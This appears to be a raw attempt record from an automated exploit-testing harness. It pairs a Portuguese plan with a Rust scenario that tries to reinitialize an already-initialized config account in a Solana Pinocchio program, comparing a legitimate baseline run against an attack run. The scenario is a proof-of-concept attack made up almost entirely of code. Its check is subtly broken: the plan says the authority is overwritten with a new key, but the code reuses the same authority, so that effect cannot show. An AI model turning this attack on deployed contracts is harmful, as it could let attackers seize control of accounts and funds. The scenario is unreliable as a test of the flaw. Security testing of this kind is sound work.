attempts.raw:
{"plan": "O programa `init` (Pinocchio) le a flag de inicializacao em data[40] sem verificar o owner da conta. O cenario monta uma conta 'config' controlada pelo atacante (owner = attacker_program) com 49 bytes e byte 40 = 0, e uma authority. O baseline chama init legitimamente e deve ter sucesso, gravando a authority e a flag. O ataque reexecuta init sobre a mesma conta ja inicializada (byte 40 = 1) apos o baseline, tentando sobrescrever o estado; o efeito mede se a authority em data[8..40] foi sobrescrita por uma nova chave, demonstrando reinit.", "scenario": "let config_key = Pubkey::new_unique();
let authority_key = Pubkey::new_unique();
let attacker_owner = env.attacker_program.unwrap_or(env.program_id);

let mut config_data = vec![0u8; 49];
config_data[40] = 0;

let config = account(&attacker_owner, &config_data, None);
let authority = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_key, false),
];
let ix = env.raw_ix(&[IX_INIT], metas);

let contas = vec![
    (config_key, config.clone()),
    (authority_key, authority.clone()),
];

let base = env.baseline("init legitimo", &ix, &contas);

let authority_apos_baseline = read_pubkey(after(&base, &config_key).data(), 8);

let contas_ataque = vec![
    (config_key, after(&base, &config_key).clone()),
    (authority_key, authority.clone()),
];

let r = env.attack("reinit sobre conta ja inicializada", &ix, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let authority_apos_ataque = read_pubkey(after(&r, &config_key).data(), 8);
    env.effect(
        "authority sobrescrita pelo reinit",
        authority_apos_ataque != authority_apos_baseline,
    );
    env.effect(
        "flag de inicializacao permanece 1 apos reinit",
        after(&r, &config_key).data()[40] == 1,
    );
}"}

